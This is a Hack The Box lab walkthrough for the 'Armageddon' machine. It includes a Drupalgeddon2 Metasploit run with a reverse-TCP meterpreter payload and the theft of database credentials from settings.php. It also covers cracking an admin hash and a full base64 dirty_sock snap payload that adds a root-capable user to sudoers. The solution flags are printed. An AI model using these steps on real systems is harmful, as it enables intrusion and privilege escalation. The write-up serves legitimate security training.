# Armageddon
https://app.hackthebox.eu/machines/Armageddon

###### Nmap 

`$ nmap -sC -A 10.10.10.223`

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
	|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
	|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
	80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
	|_http-generator: Drupal 7 (http://drupal.org)
	| http-robots.txt: 36 disallowed entries (15 shown)
	| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
	| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
	| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
	|_/LICENSE.txt /MAINTAINERS.txt
	|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
	|_http-title: Welcome to  Armageddon |  Armageddon

###### Techonologies

CMS -  Drupal 7 

Web sever - Apache/2.4.6

Prog Lang - PHP/5.4.16

Got Metasploit exploit for Drupal 7
https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/

use exploit(unix/webapp/drupal_drupalgeddon2) and set options like 
`
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       10.10.10.233     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /?q=user         yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.16      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)

`
After getting meterpreter session then open the shell and look for settings.php

	cd ..
 	cd html/sites/defalut 
 	cat settings.php 

while look into settings.php got mysql credentials.

`database' => 'drupal',
	'username' => 'drupaluser',
	'password' => 'CQHE****3gBVj'
	'host' => 'localhost',	
	'port' => ''
	'driver' => 'mysql',
	'prefix' => ''
`
look into myql 

	$ mysql -u drupaluser -h localhost -p
	password: CQHE****3gBVj
	$ use drupal
	$ select * from users
	$ ;
	$ show

And we got user and password hash!

`brucetherealadmin      $S$DgL2gjv6ZtxBo6C*************.oOsUf1xAhaadURt   admin@armageddon.eu`
			
Decode the hash with john!

`$ ehco "$S$DgL2gjv6ZtxBo6C*************.oOsUf1xAhaadURt" >> hash
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash`
			
Now ssh
`$ ssh brucetherealadmin@10.10.10.223`

cat user.txt
5a6248b6566cd486acdb64905cfc687c


### Privilege escalation

`sudo -l
(root) NOPASSWD: /usr/bin/snap install *
`
After ssh'ing into the machine go for prisec's with #snap /usr/bin/snap

	$ python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d >> ex.snap


`$ sudo /usr/bin/snap install --devmode ex.snap

$ su dirty_sock
password: dirty_sock

$ sudo -i

$ cat root.txt`
213f8d5aa5ee7627dd05dc69d64bbef4
